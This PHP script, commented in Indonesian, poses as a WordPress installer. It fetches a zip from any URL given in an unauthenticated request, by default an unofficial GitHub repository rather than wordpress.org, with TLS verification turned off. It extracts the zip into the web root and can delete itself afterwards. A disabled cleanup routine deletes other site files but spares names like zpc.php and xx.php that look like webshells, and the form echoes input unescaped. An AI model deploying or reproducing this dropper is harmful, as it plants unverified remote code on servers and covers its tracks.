<?php
// WordPress Downloader - Enhanced fallback mode
// Jika curl tidak tersedia, otomatis gunakan file_get_contents atau fopen()

// Fungsi untuk mengecek dukungan SQLite
function check_sqlite_support() {
    // Cek apakah ekstensi PDO SQLite tersedia
    if (extension_loaded('pdo_sqlite')) {
        return true;
    }
    
    // Cek apakah ekstensi SQLite3 tersedia
    if (extension_loaded('sqlite3')) {
        return true;
    }
    
    // Cek apakah ekstensi SQLite2 tersedia
    if (extension_loaded('sqlite')) {
        return true;
    }
    
    return false;
}

if ($_GET || $_POST) {
    try {
        // Cek dukungan SQLite sebelum memulai instalasi
        if (!check_sqlite_support()) {
            throw new Exception(
                'SQLite support is not available. Please install PDO_SQLite or SQLite3 extension to continue with WordPress installation.'
            );
        }
        
        $url = isset($_REQUEST['url']) ? trim($_REQUEST['url']) : '';

        if (!$url) {
            throw new Exception(
                'A WordPress release link is required. Recommended: https://github.com/tuyultugas12345-cloud/wptest/raw/refs/heads/main/wordpress.zip'
            );
        }

        $keep_wordpress_folder = !empty($_REQUEST['kwf']);
        $delete_self = !empty($_REQUEST['ds']);

        // Dynamic User-Agent
        $ua_list = [
            'Mozilla/5.0 (compatible; WP-Downloader/1.0)',
            'WordPressDownloader/'.mt_rand(100,999),
            'WP-InstallBot/'.date('Ymd')
        ];
        $ua = $ua_list[array_rand($ua_list)];

        $zipFile = 'wordpress.zip';
        $fp = fopen($zipFile, 'w');

        $download_ok = false;
        $download_error = '';

        // ====== 1️⃣ Metode utama: cURL ======
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $curl_opts = [
                CURLOPT_URL            => $url,
                CURLOPT_USERAGENT      => $ua,
                CURLOPT_FAILONERROR    => true,
                CURLOPT_HEADER         => false,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_AUTOREFERER    => true,
                CURLOPT_TIMEOUT        => 120,
                CURLOPT_FILE           => $fp,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_HTTPHEADER     => [
                    'Accept: */*',
                    'Connection: keep-alive'
                ]
            ];
            curl_setopt_array($ch, $curl_opts);

            $download_ok = curl_exec($ch);
            if (!$download_ok) {
                $download_error = 'cURL failed: ' . curl_error($ch);
            }
            curl_close($ch);
        }

        // ====== 2️⃣ Fallback: file_get_contents ======
        if (!$download_ok && ini_get('allow_url_fopen')) {
            fclose($fp); // tutup dulu file agar tidak korup
            $context = stream_context_create([
                'http' => [
                    'method'  => 'GET',
                    'header'  => "User-Agent: $ua\r\nAccept: */*\r\nConnection: keep-alive\r\n",
                    'timeout' => 120
                ],
                'ssl' => [
                    'verify_peer'      => false,
                    'verify_peer_name' => false
                ]
            ]);
            $data = @file_get_contents($url, false, $context);
            if ($data !== false) {
                file_put_contents($zipFile, $data);
                $download_ok = true;
            } else {
                $download_error = 'file_get_contents failed (URL fopen)';
            }
        }

        // ====== 3️⃣ Fallback terakhir: fopen stream copy ======
        if (!$download_ok) {
            $in = @fopen($url, 'rb');
            if ($in) {
                $out = fopen($zipFile, 'wb');
                if ($out) {
                    while (!feof($in)) {
                        fwrite($out, fread($in, 8192));
                    }
                    fclose($out);
                    $download_ok = true;
                }
                fclose($in);
            }
            if (!$download_ok) {
                $download_error = 'fopen stream failed';
            }
        }

        if (!$download_ok) {
            throw new Exception("Download failed: $download_error");
        }
        fclose($fp);

        if (!file_exists($zipFile) || filesize($zipFile) < 10000) {
            throw new Exception('Zip file not downloaded or incomplete');
        }

        // Ekstrak file ZIP
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($zipFile) !== true) {
                throw new Exception('Unable to open Zip file');
            }
            $zip->extractTo('./');
            $zip->close();
        } else {
            @shell_exec('unzip -d ./ ' . escapeshellarg($zipFile));
        }

        unlink($zipFile);

        if (!is_dir('./wordpress')) {
            throw new Exception('Unable to extract WordPress folder');
        }

        $wordpress_folder = 'wordpress/';
        if (!$keep_wordpress_folder) {
            recursive_move('./wordpress', './');
            recursive_remove('./wordpress');
            $wordpress_folder = '';
        }

        // Jalankan auto cleanup file mencurigakan
        //cleanup_php_root('./');

        if ($delete_self) {
            @unlink(__FILE__);
        }

        $status = [
            'error'   => false,
            'message' => 'Download complete using fallback method, ZIP extracted, WordPress installed'
        ];

    } catch (Exception $e) {
        $status = [
            'error'   => true,
            'message' => $e->getMessage()
        ];
    }
}

// ==================== Helper Functions ====================

function recursive_move($src,$dst)
{ 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ($file = readdir($dir)))
    { 
        if ($file != '.' AND $file != '..')
        { 
            if (is_dir($src . '/' . $file))
                recursive_move($src . '/' . $file,$dst . '/' . $file); 
            else 
                rename($src . '/' . $file,$dst . '/' . $file); 
        } 
    } 
    closedir($dir); 
} 

function recursive_remove($src)
{ 
    $dir = opendir($src); 
    while(false !== ($file = readdir($dir)))
    { 
        if ($file != '.' AND $file != '..')
        { 
            if (is_dir($src . '/' . $file))
                recursive_remove($src . '/' . $file); 
            else 
                unlink($src . '/' . $file);
        } 
    }
    rmdir($src);
    closedir($dir); 
}

// === Bersihkan file asing berdasarkan ekstensi mencurigakan ===
function cleanup_php_root($wp_root = './') {
    $core_wp_files = [
        'index.php','wp-config.php','wp-activate.php','wp-blog-header.php','wp-comments-post.php','wp-cron.php',
        'wp-links-opml.php','wp-load.php','wp-login.php','wp-mail.php','wp-settings.php','wp-signup.php',
        'wp-trackback.php','xmlrpc.php'
    ];

    $custom_whitelist = ['zpc.php','zac.php','zpc.php','wordpress.zip','z123.php','xxxl.php','wpc.php','zpc.php','xx.php','ch2.php','wordfence-waf.php','wp-downloader.php'];

    $whitelist = array_map('strtolower', array_merge($core_wp_files, $custom_whitelist));

    $suspicious_ext = ['php0','gz','tar','rar','7z','phps','phtml','bak','old','php','html'];

    foreach (glob($wp_root . '/*') as $file) {
        if (is_file($file)) {
            $basename = strtolower(basename($file));
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if (in_array($basename, $whitelist, true)) continue;
            if (in_array($ext, $suspicious_ext, true)) @unlink($file);
        }
    }
}

// === Ambil versi WP terbaru (opsional) ===
 $version = '';
 $contents = @file_get_contents('http://wordpress.org/download/');
if (!empty($contents)) {
    preg_match('/download-button.*>(.*)<\/a/iUS',$contents,$m);
    $version = trim(str_ireplace(array('&nbsp;','download','wordpress'),'',strip_tags($m[1])));
}

 $url = !isset($_REQUEST['url']) ? 'https://github.com/tuyultugas12345-cloud/wptest/raw/refs/heads/main/wordpress.zip' : $_REQUEST['url'] ;
 $kwf = (isset($_REQUEST['kwf']) AND $_REQUEST['kwf']==1) ? ' checked="checked"' : '' ;
 $ds = (empty($_REQUEST['ds']) OR (isset($_REQUEST['ds']) AND $_REQUEST['ds']==1)) ? ' checked="checked"' : '' ;

// Cek dukungan SQLite untuk ditampilkan di halaman
 $sqlite_support = check_sqlite_support();

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WordPress Downloader</title>
<style>
html{background:#f7f7f7;}body{color:#333;font-family:"Lucida Grande",Verdana,Arial,"Bitstream Vera Sans",sans-serif;}
#body{background:#fff;margin:2em auto;width:700px;padding:1em 2em;border-radius:11px;border:1px solid #dfdfdf;}
a{color:#2583ad;text-decoration:none;}a:hover{color:#d54e21;}
.message.success{background-color:#cfc;color:green;padding:10px;}
.message.error{background-color:#fcc;color:red;padding:10px;}
.message.warning{background-color:#ffc;color:#856404;padding:10px;}
</style>
</head>
<body>
<div id="body">
<h1>WordPress Downloader</h1>

<?php if (!$sqlite_support): ?>
    <p class="message warning">
        <strong>Warning:</strong> SQLite support is not detected on this server. Please install PDO_SQLite or SQLite3 extension before proceeding with WordPress installation.
    </p>
<?php endif; ?>

<?php if ($_REQUEST AND !empty($status)): ?>
    <p class="message<?php echo $status['error'] ? ' error' : ' success'; ?>"><?php echo $status['message']; ?></p>
    <?php if (!$status['error']): ?><p><a href="<?php echo !empty($wordpress_folder)?$wordpress_folder:''; ?>wp-login.php">Continue...</a></p><?php endif; ?>
<?php endif; ?>

<?php if (empty($status) OR $status['error']): ?>
<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
    <p><label>WordPress Zip URL</label>
    <input style="width:100%" type="text" name="url" value="<?php echo $url; ?>"/></p>
    <p><input type="checkbox" name="kwf" value="1"<?php echo $kwf; ?>> Keep <code>wordpress</code> folder</p>
    <p><input type="checkbox" name="ds" value="1"<?php echo $ds; ?>> Delete self after install</p>
    <p><input type="submit" value="Download Now!" <?php echo !$sqlite_support ? 'disabled' : ''; ?>/></p>
</form>
<?php endif; ?>
</div>
</body>
</html>